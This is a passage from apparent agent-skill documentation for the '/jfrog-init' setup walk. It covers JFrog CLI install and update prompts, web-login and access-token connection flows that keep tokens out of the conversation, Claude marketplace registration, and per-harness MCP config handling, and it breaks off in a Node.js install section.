        {"label": "Yes", "description": "Install the JFrog CLI now. May add one line to your shell startup file so future terminals can find it."},
        {"label": "No",  "description": "Cancel /jfrog-init."}
      ]
    }
  ]
}
```

When it instead exits red with `reason: "broken"` (`jf` **is** on PATH
but hung, timed out, or failed to run), the "isn't installed" wording
above is false — use this payload instead:

```json
{
  "questions": [
    {
      "question": "JFrog CLI is installed but isn't responding (may be corrupted or hung). Reinstall it now?",
      "header": "Reinstall jf",
      "multiSelect": false,
      "options": [
        {"label": "Yes", "description": "Reinstall the JFrog CLI now. May add one line to your shell startup file so future terminals can find it."},
        {"label": "No",  "description": "Cancel /jfrog-init."}
      ]
    }
  ]
}
```

The user picks with arrow keys. The `question` text is the entire
user-facing message for this step, for either branch.

**Do not** mention any install method (`npm install -g`, the direct
binary download), the package name (`jfrog-cli-v2-jf`), the install
path (`~/.jfrog/bin`), or any other implementation detail — not in the
question, not in an option description, not anywhere. The user only
needs to answer Yes or No; everything else is noise.

Forbidden phrases (non-exhaustive — never surface any of these in the
question or its option descriptions):
- *"via npm"* / *"npm install -g"* / *"as a global Node package"*
- *"download the binary"* / *"from releases.jfrog.io"* / *"to
  ~/.jfrog/bin"*
- *"~68 MB download"* / any size or timing hint

On **Yes**, run `jfrog-install-jf-cli.mjs` directly. On **No** (or the
user selects "Other" and types an out-of-band answer), stop the walk
and tell the user `/jfrog-init` cannot continue without `jf`.

`jfrog-install-jf-cli.mjs` tries npm first (JFrog's own documented
method, retried against the public registry if a private one fails),
then falls back to a checksum-verified direct binary download if npm
itself can't complete the install — and verifies `jf --version`
resolves before reporting success either way. See
`jf-cli-install-internals.md` for exactly how each plan works,
including the one npm trade-off the script can't detect or fix.

After the install runs, re-invoke `jfrog-detect-jf-cli.mjs`. If still
red, stop and show the raw error verbatim; do not guess at a second fix.


## jf-cli-update-prompt

# Step 2 — the update prompt

**Required behavior for Step 2's red branch when `reason` is
`"outdated"`, not optional background.** When `jfrog-detect-jf-cli.mjs`
exits red with `reason: "outdated"` (`jf` is installed, but below the
minimum version), call `AskUserQuestion` with this exact payload shape
— same shape as the install prompt (`jf-cli-install-prompt.md`), just
worded for an update instead of a fresh install:

```json
{
  "questions": [
    {
      "question": "JFrog CLI <version> is older than required. Update it now?",
      "header": "Update jf",
      "multiSelect": false,
      "options": [
        {"label": "Yes", "description": "Update the JFrog CLI now."},
        {"label": "No",  "description": "Cancel /jfrog-init."}
      ]
    }
  ]
}
```

Fill in `<version>` with the detector's own `currentVersion` field (the
raw `jf --version` output, and nothing else). Do **not** use `detail`
for this — it also carries the required minimum version number, which
the very next rule forbids surfacing to the user. The `question` text
is the entire user-facing message for this step.

**Do not** mention any install/update method (`npm install -g`), the
package name (`jfrog-cli-v2-jf`), or the specific minimum version number
— not in the question, not in an option description. The user only
needs to answer Yes or No.

On **Yes**, run `jfrog-install-jf-cli.mjs` directly — the same script
Step 2's install path uses. `npm install -g jfrog-cli-v2-jf` upgrades an
existing install in place, so there's no separate update script. On
**No** (or an out-of-band "Other" answer), stop the walk and tell the
user `/jfrog-init` cannot continue without an updated JFrog CLI.

After the update runs, re-invoke `jfrog-detect-jf-cli.mjs`. If still red
with `reason: "outdated"`, stop and show the raw error verbatim; do not
guess at a second fix.

## Why there's a minimum version at all

JFrog CLI v2.106.0 or later, configured for your JFrog Platform, is
required for the Agent Plugins Repositories feature this walk's own
Step 6 (AI Catalog) depends on. For more information, see [Configure
the JFrog CLI](https://docs.jfrog.com/artifactory/docs/agent-plugins-repositories#configure-the-jfrog-cli)
in Agent Plugins Repositories.


## jf-config-auth-picker

# jf config: web login vs. access token

**Required behavior wherever this file is the referenced fix, not
optional background.** Three call sites land here, with two
different option sets:

- **Step 3** (`jf` is installed but not connected to any server at
  all) — full picker: **Web login or Access token**.
- **Step 4**, when sub-check (1) (reachability) passed but sub-check
  (2) (`jf rt ping`) failed with an auth-shaped error — `jf` is
  already connected to a server, its token is just stale. **Token
  only** (see "Why a stale token gets the Token branch only" below) — skip straight to
  that section.
- **Step 4, a different AI Governance server** — full picker, with the
  two differences listed in `ai-governance-server.md`.

## Step 3: ask web vs. token

```json
{
  "questions": [
    {
      "question": "How do you want to connect to your JFrog Platform?",
      "header": "Connect",
      "multiSelect": false,
      "options": [
        {"label": "Web login", "description": "Opens in your browser. I'll drive the rest."},
        {"label": "Access token", "description": "You paste a token into one command you run yourself."}
      ]
    }
  ]
}
```

If the URL isn't already known, ask for it in a plain chat message
first (*"What's your JFrog Platform URL?"*) — both branches need it.
**Plain chat message, not `AskUserQuestion` with suggested options** —
there is no real candidate to offer here (unlike the server/project
pickers, which choose among *actual configured* values), so a picker
would only ever be guessing. Never suggest, guess, or pre-fill a
specific JFrog Platform URL (e.g. `mycompany.jfrog.io`, or anything else
inferred from the user's email domain, org, or prior context) — wait
for the user to type their own.

### Web login branch

This skill carries its own local copies of the web-login scripts under
`scripts/` — nothing is invoked cross-skill from the base `jfrog` skill.
The token never passes through this conversation.

1. **Register the session:**
   ```bash
   node "${CLAUDE_SKILL_DIR}/scripts/jfrog-login-register-session.mjs" "<url>"
   ```
   Both login scripts are pure Node — unlike Step 2's `jf` CLI itself,
   there's no separate prerequisite probe needed here (no `uuidgen`/`jq`
   dependency to check for). Exit 2 = server unreachable, exit 3 =
   registration failed — either one is a **red**, same as any other Step
   3/4 red: show the raw error, stop.
2. **Build the login URL** from `SESSION_UUID`:
   ```
   <url>/ui/login?jfClientSession=<SESSION_UUID>&jfClientName=JFrog-Skills&jfClientCode=1
   ```
   **Open it in the user's default browser automatically — do not just
   print the link and ask them to click it themselves.** Use the
   OS-appropriate opener:
   ```bash
   open "<login-url>"          # macOS
   xdg-open "<login-url>"      # Linux
   start "" "<login-url>"      # Windows (cmd) / `Start-Process "<login-url>"` in PowerShell
   ```
   If the opener command fails or isn't available (headless/remote
   session, no `$DISPLAY`, etc.), fall back to showing the link as text
   so the user can open it manually — don't treat that as a hard
   failure. This mirrors the base `jfrog` skill's own
   the `jfrog-login-flow` section of the `#jfrog-init-references` steering step 2 exactly; it's spelled out
   again here, in full, rather than left as a cross-reference, because a
   model following only this file (never opening the base skill's doc)
   must still open the browser automatically, not silently fall back to
   printing the link.

   Show the verification code prominently, then confirm the link was
   opened (or provide it, on fallback):

   > ## Verification code: `<last 4 chars of SESSION_UUID>`
   >
   > I've opened the login page in your browser — enter the code above.
   >
   > Let me know when you're done.

   Then `AskUserQuestion`:
   ```json
   {
     "questions": [
       {
         "question": "Did you finish logging in?",
         "header": "Continue",
         "multiSelect": false,
         "options": [
           {"label": "Yes, continue",           "description": "Retrieve credentials and continue the walk."},
           {"label": "No, cancel /jfrog-init", "description": "Stop the walk cleanly."}
         ]
       }
     ]
   }
   ```
3. On **Yes**, retrieve and save credentials:
   ```bash
   node "${CLAUDE_SKILL_DIR}/scripts/jfrog-login-save-credentials.mjs" "<url>" "<SESSION_UUID>"
   ```
   Exit 0 → done; the only thing this prints is `SERVER_ID=<id>` and an
   Artifactory version check — the token itself never appears in this
   script's output, and this skill never reads it. Exit 2/3/4 → the
   session's one-time token is now consumed either way (see the base
   skill's "Gotchas") — tell the user plainly it didn't work and offer
   to either restart web login from step 1 above or switch to the
   Token branch; don't retry silently.
4. Re-run whichever detector sent you here (`jfrog-detect-jf-config.mjs`
   for Step 3) to confirm green, then continue.

Skip the base skill's "make it the default `jf` server?" gate — this
skill's own server resolution (the `server-picker` section of the `#jfrog-init-references` steering /
"Resolving `<server-id>`" in `SKILL.md`) already uses the sole
configured server silently when there's only one, so that question
would be redundant here.

### Token branch (Step 3, and the only option for Step 4)

Print exactly one ready-to-run command, with `--url` (and, for Step 4,
the already-resolved `--server-id`) filled in — the user runs it
**themselves, in their own terminal**, picks **Access Token**, and
pastes their token at jf's hidden prompt (never on the command line,
where other local users can read it in process listings). **Never** ask
for the token in chat, and never run this command yourself via the
Bash tool — the token must not enter this conversation at all.

- **Step 3** (no server-id yet — one will be created):
  ```
  jf config add jfrog --url=<url> --interactive
  ```
- **Step 4** (existing server, refreshing a stale token — reuse the
  already-resolved `<server-id>` and `--overwrite` so this updates the
  same entry instead of creating a second one):
  ```
  jf config add <server-id> --url=<url> --interactive --overwrite
  ```

Send this as its own chat message (same rule as today: no `!` prefix —
that runs inside Claude Code's own shell). Then `AskUserQuestion`:

```json
{
  "questions": [
    {
      "question": "Did you finish running that command?",
      "header": "Continue",
      "multiSelect": false,
      "options": [
        {"label": "Yes, continue",           "description": "Re-check and continue the walk."},
        {"label": "No, cancel /jfrog-init", "description": "Stop the walk cleanly."}
      ]
    }
  ]
}
```

On **Yes** → re-run the same detector that sent you here
(`jfrog-detect-jf-config.mjs` for Step 3, `jfrog-detect-server-ping.mjs
[server-id]` for Step 4 — never the other one). If still red, print
the same command and the same `AskUserQuestion` again — the loop is
harmless. On **No** → stop with exactly one sentence: *"OK — run
`/jfrog-init` again when ready."* Nothing else.

## Why a stale token gets the Token branch only

`jfrog-login-save-credentials.mjs` derives (or overwrites) a server
entry **from the URL itself** (`https://mycompany.jfrog.io` →
`mycompany`), independent of whatever server-id Step 4 actually
resolved. Running the web-login branch to refresh a stale token could silently create a
*second*, differently-named server instead of refreshing the token on
the one Step 4 is checking — so the stale-token fix only ever offers the Token
branch above, which explicitly reuses the existing `--server-id`.

## Step 4's full branch table

`jfrog-detect-server-ping.mjs [server-id]` runs two sub-checks, both
must pass: (1) an anonymous `fetch` of `<url>/artifactory/api/system/ping`
— HTTP `200/401/403` = up, `404`/connection failure/`5xx` = red; (2)
`jf rt ping --server-id=<id>`, token kept inside `jf`'s process — a
pass means the token is valid and authorized, the earliest signal of a
stale credential before it fails later at runtime. Sub-check (1) green
+ (2) red = tailor the message: an auth-shaped error points at a stale
token (the token-only fix above); a 30s timeout points at network/VPN;
anything else shows the raw `jf rt ping` error without guessing a cause.

- **Exit 0 (green)** → continue with the rest of Step 4.
- **Exit 1 (red)** → branch on the detector's `detail`, don't just stop
  and dead-end on a generic "check with your admin":
  - **Credentials invalid/expired** (sub-check (1) passed, only the
    token is stale) → use the token-only fix above, then re-run *this
    step's* detector (`jfrog-detect-server-ping.mjs`, not Step 3's) —
    the user already has `jf` connected, they just need a fresh token.
  - **Anything else** (connection failed, timeout, unexpected HTTP
    code, reachability itself failed) → **stop.** No fix script. Show
    the raw error line verbatim and tell the user to fix that and
    re-run `/jfrog-init`.
- **Exit 2 (ask)** → multiple servers configured, none marked
  `isDefault`, no server-id passed. **Stop and read
  the `server-picker` section of the `#jfrog-init-references` steering in full**, then re-invoke with the
  pick as the positional argument.

## What the token flow never does

Neither this file's Token branch nor the Web branch's scripts ever
print, log, or store a token where this skill (or the model) can read
it: the Token branch's command is run by the user in their own
terminal; the Web branch's `jfrog-login-save-credentials.mjs` keeps the
retrieved token inside its own process and only ever prints
`SERVER_ID=...` plus a version check. `jfrog-detect-jf-config.mjs` only
checks *that* a server is configured (masked `jf config show` output);
`jfrog-detect-server-ping.mjs` validates the token via `jf rt ping`,
keeping it inside `jf`'s own process the whole time.


## marketplace-setup

# Step 7 — Claude agent-plugin marketplace

**Required behavior for Step 7, not optional background.**

## What this step does

Registers the JFrog Claude agent-plugin marketplace with
Claude Code (declared in its config, then fetched with
`claude plugin marketplace update <name>`), so plugins
published to Artifactory become installable via `/plugin install`.
`jfrog-add-claude-marketplace.mjs` does all of it, including the
config writes below — never call `claude` yourself.

## Where the token is stored

Nowhere new. The script installs a helper at
`~/.jfrog/skills/marketplace-headers.mjs` (under `JFROG_CLI_HOME_DIR` when
set) and declares the marketplace in Claude Code's config (`settings.json`
and `plugins/known_marketplaces.json` under `CLAUDE_CONFIG_DIR`, default
`~/.claude`) with a `headersHelper` naming that helper and the resolved
server. Claude Code runs the helper on each marketplace and plugin fetch;
it asks `jf` for the token at request time, so neither file nor any command
line holds it. Discovery also goes through `jf`, so `jf`'s proxy settings apply.

Copies an earlier Step 7 left are removed. A token in another JFrog
marketplace entry's URL or `Authorization` header is dropped, and an entry
on the same JPD gets the same `headersHelper` so it still logs in. After a
successful register, the `~/.netrc` block for this JPD's host whose password
is the token `jf` holds is deleted; every other block stays, including one
for this host with another password.

Requirements, or the script fails red and the user adds the marketplace by hand:

- `jf` on `PATH` and logged in to that server.
- Claude Code 2.1.238 or later.
- A server ID of letters, digits, `.`, `_` or `-` only.

## Server scope

Never ask which server to use — this step is non-blocking, so with
nothing resolvable it fails red instead.

## Required branches

All three follow `SKILL.md`'s Final summary rule 5, verbatim.

- **Exit 0 (green)** → the ✅ line and the success sentence.
- **Exit 1 or 3 (red)** → the ⚠️ line, and nothing about the cause.
- **Skipped (Step 6 not green, or not Claude Code)** → say **nothing**,
  exactly as if Step 7 didn't exist for this walk.


## mcp-plugin-config

# Step 5 — plugin-owned mcp.json: mechanics and per-harness paths

Background for Step 5 of `/jfrog-init` (`SKILL.md`). The model doesn't
need this to execute the step — `jfrog-detect-jfrog-mcp.mjs` handles
detection, substitution, and (OpenCode only) writing a new entry, and
reports the result as JSON — but it's useful for debugging a red/error
result or explaining what happened.

**Placeholder substitution (Cursor / VS Code / Claude Code).** The
plugin sometimes ships an `mcp.json` where the JPD URL is a placeholder
that would otherwise need to be resolved at runtime from an env var:

```json
{"mcpServers": {"jfrog": {"url": "https://${JFROG_PLATFORM_URL}/mcp"}}}
```

Codex's plugin ships the same idea in a different shape — no
`mcpServers` wrapper, and angle brackets instead of `${...}`:

```json
{"jfrog": {"url": "https://<JFROG_PLATFORM_URL>/mcp"}}
```

The VS Code plugin uses VS Code's own env-var syntax, with an `env:`
prefix inside `${...}`:

```json
{"mcpServers": {"jfrog": {"type": "http", "url": "https://${env:JFROG_PLATFORM_URL}/mcp"}}}
```

The Copilot extension **does not** expand `${env:VAR}` before loading
the MCP, so leaving the placeholder in place also silently fails to
connect; Step 5 substitutes it the same way as the others.

Because we have that URL sitting in `jf config`, and because leaving
the placeholder in place means the MCP silently fails to load in the
IDE / agent, Step 5 auto-substitutes it. If the detector finds the
placeholder pattern anywhere in the file, it calls
`jfrog-substitute-mcp-placeholders.mjs`, which:

1. Parses the file as JSON and looks **only** at the `jfrog` entry's
   `url` (nested under `mcpServers` on every harness but Codex, which
   has no wrapper) — never a file-wide text replace, so an unrelated
   MCP server entry or JSON value that happens to contain the same
   placeholder text is never touched.
2. Reads the JPD URL from `jf config` (default server, or the one
   passed as arg 2), normalizes it to the JPD root, and substitutes it
   into that one `url` string.
3. Replaces in two passes — first a placeholder preceded by a scheme
   (`https://${...}`, where our own scheme would otherwise double up),
   then a bare one. Each pass recognizes four syntaxes: `${VAR}`,
   VS Code's `${env:VAR}`, bare `$VAR`, and Codex's `<VAR>`.
4. Re-serializes the whole file (`JSON.stringify(parsed, null, 2)`) and
   writes atomically (temp file + rename) so a partial write cannot
   corrupt the file. Original formatting/whitespace elsewhere in the
   file is not preserved byte-for-byte.
5. Is idempotent — subsequent runs find no placeholder and no-op.

This is the ONLY place `/jfrog-init` writes to the plugin-owned
`mcp.json` for these three harnesses. Everything else in Step 5 is
read-only for them — with three further exceptions: OpenCode, Kiro CLI,
and Junie (see below).

**OpenCode is structurally different.** The JFrog OpenCode plugin
(`@jfrog/opencode-jfrog-plugin`) ships no static `mcp.json` of its
own — it injects an `mcp.jfrog` entry into OpenCode's in-memory config
at startup, via a `config` hook, but **only when `$JFROG_PLATFORM_URL`
is set**. `/jfrog-init` deliberately does not rely on that env var —
the JPD URL is already known from `jf config`, the same as every other
harness — so instead it writes the entry directly into the **user's
own** OpenCode config file:

```json
{"mcp": {"jfrog": {"type": "remote", "url": "https://acme.jfrog.io/mcp", "enabled": true}}}
```

If the detector finds no `mcp.jfrog` entry at all (the expected steady
state until this runs once), it calls `jfrog-write-opencode-mcp.mjs`,
which:

1. Parses the file as **strict JSON**. If that fails — most often
   because it's an `opencode.jsonc` with comments, which a
   `JSON.parse`/`JSON.stringify` round-trip would silently destroy —
   it refuses to write and reports an error instead; Step 5 falls back
   to a manual-paste instruction (see
   `jfrog-reinstall-jfrog-plugin.mjs`'s OpenCode branch) rather than
   risking comment loss.
2. Never overwrites an existing `mcp.jfrog` entry — same behavior as
   the plugin's own runtime injection, and it protects any manual
   configuration the user already has.
3. Reads the JPD URL from `jf config` (default server, or the one
   passed as arg 2) and writes `{"type": "remote", "url": "<jpd>/mcp",
   "enabled": true}` under `mcp.jfrog`.
4. Re-serializes the whole file and writes atomically (temp file +
   rename), same as the placeholder substituter.
5. Is idempotent — subsequent runs find the entry already present and
   no-op.

This is the ONLY place `/jfrog-init` writes to the user's own OpenCode
config, and the only Step 5 write that targets a file NOT owned by the
plugin (there is no plugin-owned file for OpenCode to write to).

**Per-harness plugin-owned config file:**

| Harness      | Plugin-owned config file |
|--------------|--------------------------|
| Cursor       | `~/.cursor/plugins/cache/cursor-public/jfrog/<sha>/mcp.json` (glob → newest) |
| VS Code      | `~/.vscode/agent-plugins/github.com/jfrog/vscode-plugin/plugin/.mcp.json` |
| Claude Code  | `~/.claude/plugins/cache/<marketplace>/jfrog/<version>/.mcp.json` (glob) |
| Codex        | `$CODEX_HOME/plugins/cache/codex-plugin/jfrog/<version>/.mcp.json` (glob → newest; `$CODEX_HOME` defaults to `~/.codex`) |
| OpenCode     | *(no plugin-owned file — see above)* |
| Kiro (IDE)   | `~/.kiro/powers/installed/jfrog-kiro-power/mcp.json` (stable path) |
| Kiro CLI     | `~/.kiro/settings/mcp.json` — Kiro's own global MCP config, not shipped by any plugin, so the `jfrog` entry is **created or merged in** with a placeholder url, then substituted like every other row above |
| Devin        | `~/.local/share/devin/cli/plugins/cache/github.com_jfrog_devin-plugin-<sha>/<version>/mcp.json` (glob → newest; the scan is restricted to slugs starting with `github.com_jfrog_devin-plugin-` so other Devin plugins that also ship an `mcp.json` can't be picked up by mistake) |
| Junie        | `~/.junie/mcp/mcp.json` — Junie's own global MCP config; the `jfrog` entry is **created or merged in** with a placeholder url, then substituted like every other row above |

**OpenCode's own config file** (not plugin-owned — this is the user's
personal config). The global file (item 3 below) is **always** loaded by
OpenCode; `$OPENCODE_CONFIG` / `$OPENCODE_CONFIG_DIR` each add a second
file merged on top of it — they do **not** replace it (see
[harness-opencode.md](the `harness-opencode` section of the `#jfrog-mcp-management-references` steering)).
`$OPENCODE_CONFIG` is honored as the write target (the file must already
exist on disk — start OpenCode once to initialize it):

1. `$OPENCODE_CONFIG`, if set (an explicit file path override).
2. `$OPENCODE_CONFIG_DIR/opencode.json[c]`, if `$OPENCODE_CONFIG_DIR` is set.
3. `~/.config/opencode/opencode.json` (or `.jsonc`, if that's the one
   that already exists) otherwise — the global file OpenCode always loads
   (honors `$XDG_CONFIG_HOME`). Not a macOS/Linux-only example: neither
   OpenCode nor this resolver translates it on Windows, so the literal
   path there is `homedir()\.config\opencode\opencode.json` (e.g.
   `C:\Users\<user>\.config\opencode\opencode.json`) — no `%APPDATA%`.
   Confirmed live on Windows: a fresh install's first run creates exactly
   that path (as `opencode.jsonc`, its default first-run format).

Whenever the write target picked from 1 or 2 above isn't the global file
itself, `jfrog-resolve-mcp-config.mjs` also returns the global file as
`layerPaths`, and `jfrog-detect-jfrog-mcp.mjs` checks it for an existing
`mcp.jfrog` entry before writing — deferring to that entry instead of
writing a second one into the override file, which OpenCode's merge would
otherwise let shadow it.

Project-scope `opencode.json` (in the project root) is deliberately
**never** used — a project config is often committed to git, and writing
a `jfrog` MCP entry into a file the user might share is a different
action than writing to a personal, git-ignored config.

The Kiro CLI / Junie merge is additive and never destructive: the file normally
holds the user's other MCP servers, so a `jfrog` entry that already has a
url is left untouched (a placeholder in it is the substitution step's
job), other servers and the file's mode are preserved, a symlinked config
stays a symlink, and a file that isn't valid JSON is reported rather than
rewritten.

Harness detection (in priority order): `CODEX_SANDBOX` / `CLAUDECODE` /
`CURSOR_TRACE_ID` / `OPENCODE` / `OPENCODE_SESSION_ID` / `VSCODE_PID` /
`TERM_PROGRAM` / `JUNIE_DATA` / `JUNIE_SHIM_PATH`. Override with
`JFROG_INIT_HARNESS=claude|cursor|vscode|codex|opencode|kiro|kiro-cli|devin|junie`
or a specific file via `JFROG_INIT_MCP_CONFIG=/abs/path`. Kiro / Kiro CLI /
Devin have no auto-detect signal, and the Copilot extension runtime
may sanitize VS Code's env vars from the plugin subprocess — all four
are reachable via the matching `JFROG_INIT_HARNESS=...` override,
exported from Step 5 in `SKILL.md`.

`SKILL.md`'s Step 5 already has you export `JFROG_INIT_HARNESS=kiro` /
`kiro-cli` / `vscode` / `devin` up front when you're running as one of
those targets — before the detector ever runs, so Exit 3 below isn't
the trigger for it.

**What the detector verifies** (three things):

1. Config file exists and is non-empty at its harness-specific path.
2. Parses as valid JSON.
3. Contains a `jfrog` entry (`mcpServers.jfrog` on Cursor/VS Code/Claude
   Code, bare top-level `jfrog` on Codex, `mcp.jfrog` on OpenCode) with
   a non-empty `url`. An entry that exists but has a missing or empty
   `url` also causes a red — fix or remove the entry and re-run.

It does NOT enforce any other `type`/`url` shape (each plugin owns its
own schema), and does NOT probe the endpoint — whether the server is
actually enabled on the JPD is a separate, network check (see
"MCP-responding probe" below).

**Step 5 branches, required behavior:**

- **Exit 0 (green)** → proceed to Step 6.
- **Exit 1 (red)** or **Exit 3 (error)** → **non-blocking** — proceed
  to Step 6 as if green, but remember the cause for the Final Summary.
  Steps 6 and 7 call the JPD's REST APIs directly with `jf config`
  credentials, never through the `jfrog` MCP entry, so a broken or
  missing config doesn't affect whether those checks are accurate —
  there's nothing to gain by stopping the walk over it. Tell the
  causes apart from the detector's `detail` for the Final Summary
  note:
  - **(Cursor / VS Code / Claude Code / Codex / Kiro IDE)** Plugin file
    missing / empty / lacks a valid `jfrog` entry. Fix: **reinstall or
    update the JFrog plugin.** If the user asks why or how to fix it, run:

    ```bash
    node "${CLAUDE_SKILL_DIR}/scripts/jfrog-reinstall-jfrog-plugin.mjs"; true
    ```

    and relay its per-harness remedy — it only diagnoses and prints,
    never writes to the plugin's mcp.json.
  - **(Cursor / VS Code / Claude Code)** Plugin file has a placeholder
    and automatic substitution failed with no url set for the resolved
    server-id. Fix: **resolve `jf config`**. Reinstalling the plugin
    does not fix this.
  - **(OpenCode)** Config has no `mcp.jfrog` entry and the automatic
    write failed — either no `jf` server resolvable (fix: **resolve
    `jf config`**) or the file isn't strict JSON (fix: **paste the
    entry in manually** — run `jfrog-reinstall-jfrog-plugin.mjs` for
    the exact JSON to paste and where).
  - **(Kiro CLI / Junie)** Could not create or update the tool's own global
    MCP config (`~/.kiro/settings/mcp.json` for Kiro CLI, `~/.junie/mcp/mcp.json`
    for Junie) — no plugin ships this file, so there's nothing to reinstall. The
    detail names the actual cause. Fix: **correct the file or
    parent-directory permissions/path**, then re-run.
  - (Exit 3 only) Harness could not be detected, or the config file is
    invalid JSON / unreadable. Show the raw detector error in the note.
    **Do not react to this by guessing a harness or trying
    `JFROG_INIT_HARNESS` values to see what resolves it.** If this is
    Kiro, Kiro CLI, or Copilot in VS Code, the override was already
    exported before the detector's first run (top of Step 5), so it
    should not reach Exit 3 for that cause at all. Otherwise this is
    Exit 3, non-blocking
    like every other cause above: note it and move on to Step 6 in the
    same turn, with zero visible pause — do not stop to read this file
    or any other reference doc over it.
- **Exit 2 (`ask`)** → the one outcome that still blocks: a fix needs
  the jf server-id (placeholder substitution on Cursor/VS Code/Claude
  Code, or the initial write on OpenCode/Kiro CLI/Junie) but it's ambiguous —
  every step from here on needs a resolved server-id, so there's nothing
  to skip ahead to. **Stop and read the `server-picker` section of the `#jfrog-init-references` steering in
  full**, then re-invoke with the pick as the positional argument.

**Note on Claude Code**: today the released Claude JFrog plugin does
not include a `.mcp.json` in its shipped tree, so Step 5 goes red on
Claude Code until the plugin ships one — this no longer stops the
walk, but the Final Summary still notes it. Never fall back to
project-scope `.mcp.json`.

## Step 5b (OpenCode only) — MCP auth token

Step 5 wires the `mcp.jfrog` *address*; OpenCode's `"type": "remote"` entry
also needs its own OAuth token before MCP tools work. That token lives in
`~/.local/share/opencode/mcp-auth.json` (honors `$XDG_DATA_HOME`), keyed
by server name (`jfrog`), managed by OpenCode — never by this skill. Same
un-translated path on Windows (`homedir()\.local\share\opencode\mcp-auth.json`,
no `%LOCALAPPDATA%`) — see the config-path note above. The parent directory
(`.local\share\opencode`) is confirmed live on Windows, holding OpenCode's
db/log/repos; the `mcp-auth.json` file itself only appears after an actual
OAuth handshake, not from an install alone, so its exact path is inferred
from source (`packages/opencode/src/mcp/auth.ts` in `anomalyco/opencode`),
not observed directly.

A non-empty `jfrog` key in that file is **not** proof of a working credential:
OpenCode writes PKCE state there *before* the browser redirect and only adds
`tokens.accessToken` once the OAuth callback completes. A user who started
but never finished the browser login is left with a key but no token.
`jfrog-detect-opencode-mcp-auth.mjs` checks `tokens.accessToken` specifically.

The auth command is interactive (opens a browser, blocks up to 60s) — no
non-interactive form exists. The script is read-only; the fix is always
the user running `opencode mcp auth jfrog` themselves.

**Exit codes:** 0 = token present; 1 = missing or incomplete (tell user to
run `opencode mcp auth jfrog`, non-blocking); 3 = file unreadable/invalid
JSON (non-blocking, note in Final Summary). Never runs on Cursor/VS
Code/Claude Code — those use `jf config` credentials directly.

## MCP-responding probe — is the server enabled on this JPD?

The config check proves the plugin's `mcp.json` is wired up, not that a
Platform Admin has **enabled** the JFrog MCP server. An enabled endpoint is
OAuth-protected (it answers a Bearer challenge); until an admin enables it,
`<JPD>/mcp` has no challenge — a bare 403 on SaaS, or 404 self-managed.
After the config check, run once:

```bash
node "${CLAUDE_SKILL_DIR}/scripts/jfrog-detect-jfrog-mcp-responding.mjs" "[server-id]"; rc=$?; true
```

No result here stops `/jfrog-init` — the walk always finishes, and it never
pauses for MCP sign-in mid-way; any sign-in offer waits until **after the Final
Summary**. When the config check was green, the **probe decides** the Final
Summary's **JFrog MCP Plugin** line, because it is the only signal tied to
*this* JPD.

> Note: the JFrog MCP tools you can see may belong to a *different* JPD (you can
> be signed in to JPD-A while probing JPD-B), so they confirm sign-in only when
> they target *this* JPD's base URL, and **never** turn a `not_enabled` or
> `unreachable` probe green.

- **Exit 4 (`not_enabled`)** → `not enabled on this JPD`, plus the fix from the
  detector's `detail` (*ask your JFrog platform admin to enable it*, with the
  docs link `https://docs.jfrog.com/integrations/docs/enable-the-jfrog-mcp-server`).
- **Exit 1 (`unreachable`)** → `could not confirm it's enabled`. Often transient
  (proxy / VPN / timeout); re-run to recheck.
- **Exit 0 (`enabled`)** → this JPD's MCP endpoint is on, but that's about the
  **server**, not your **sign-in**. Decide whether *this* JPD's `jfrog` tools are
  actually **authorized and usable this turn**, cheapest first:
  1. **Already conclusive → ✅** (no extra call): the tools show as **connected /
     authorized** and you can use them, or you've **already used** one
     successfully this walk.
  2. **Not yet conclusive, but a `jfrog` tool is callable** without starting a
     sign-in → **make ONE cheap, read-only `jfrog` call to confirm**: it returns
     data → **✅**; it comes back `401` / `needsAuth` → ⚠️ `enabled — sign in to
     use it`.
  3. **No `jfrog` tool callable this turn**, or confirming would first need a
     sign-in → ⚠️ `enabled — sign in to use it` (the default).

  Why "enabled" alone isn't ✅: an enabled endpoint answers an OAuth **Bearer
  challenge**, so a probe `detail` of `HTTP 401` here is the *normal* signature of
  "enabled" — not proof you're signed in. (A *bare* 401 with no challenge is
  Exit 1 `unreachable`, a different branch.) And a tool merely **appearing in the
  list** can show before OAuth completes — presence isn't authorization.

  Re-decide every walk (even a repeat in the same session); never reuse a stale
  result.

  **Offering sign-in** — only when the status is ⚠️ `enabled — sign in to use it`:
  - Step 5 is non-blocking → do **not** open the browser here; offer sign-in only
    **after the Final Summary**.
  - If the user accepts, trigger the JFrog MCP's own sign-in via your harness's
    MCP auth, then re-check:
      - tools now visible → connected
      - still not visible → reload the window (don't re-ask an already signed-in user)
  - **Junie exception** — you **can't** trigger it yourself (the `jfrog` tools
    aren't exposed to your turn); tell the user instead, per surface:
    - **Junie CLI** → run `/mcp`, **Authorize** the `jfrog` entry, finish the
      browser login (tools load in the same session, no restart).
    - **JetBrains IDE panel** → open **Settings → Tools → Junie → MCP Settings**,
      authorize/reconnect `jfrog`, then reload the window.
    - Either way, offer to re-check once they confirm.

The result is in `jfrog-detect-all.mjs`'s summary as `mcpResponding`
(with `mcpRespondingReason` on the non-green cases). The auth-status read
above is an agent-level check, not part of that script's output.


## node-install-prompt

# Step 1 — the Node.js install prompt

**Required behavior for Step 1's red branch, not optional background.**
When `node --version` is missing/unparseable/`< 18`, or when `npx
--version` fails (node present but npx absent — same red branch), ask
the user (see `how-to-ask-user.md` for native tool and fallback rules):

- **Question**: "Node.js `<note>`. Install it now?"
  — where `<note>` is a brief, accurate description of what the tool
  output actually showed (e.g. "isn't installed", "`v16.4.0` is too old
  (need ≥ 18)", "is installed but npx is missing").
- **Yes**: "Install Node.js now. Adds a line to your shell startup file so future terminals can find it."
- **No**: "Cancel /jfrog-init."

**Do not** mention any install method (nvm, winget), a version manager
name, or any URL — not in the question, not in an option description.
The user only needs to answer Yes or No.

On **No** (or an out-of-band "Other" answer), stop the walk and tell
the user `/jfrog-init` cannot continue without Node ≥ 18.

## On Yes: no script — run these commands directly

**Node missing entirely means no `.mjs` script can run to install it**
(same chicken-and-egg reason Step 1 has no detector script at all — see
`SKILL.md`). The install itself is a bash/PowerShell command run
directly via the Bash tool, exactly like Step 1's own `node --version`
check, with the same `; true` treatment described in
`script-invocation.md`.

First, determine the platform:

```bash
uname -s 2>/dev/null || echo Windows_NT
```

**macOS / Linux** (anything other than a Windows-shaped result) — install
a pinned `nvm` release, then install the current Node LTS. The version
below is pinned rather than resolved from `api.github.com/.../latest` —
that endpoint is unauthenticated and rate-limited to 60 requests/hour per
IP, so it routinely 403s behind a corporate NAT; when it fails silently
(redirected to `/dev/null`), the tag resolves to an empty string, the
